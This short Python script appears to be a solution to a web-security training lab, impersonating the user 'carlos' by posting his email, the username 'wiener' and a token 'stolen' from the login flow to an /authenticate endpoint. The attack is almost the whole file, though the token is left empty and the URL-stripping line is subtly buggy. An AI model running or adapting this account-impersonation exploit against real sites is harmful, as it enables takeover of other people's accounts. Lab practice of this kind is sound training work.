import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

s = requests.Session()

home_url = f'https://{site}/'
resp = s.get(home_url)

# Steal from the authenticate endpoint during the login process
token = ''

# Impersonate Carlos by using his email to authenticate with the stolen token
auth_url = f'https://{site}/authenticate'
payload_data = {
    'email': 'carlos@carlos-montoya.net',
    'username': 'wiener',
    'token': token
}
resp = s.post(auth_url, json=payload_data)
print(resp.status_code)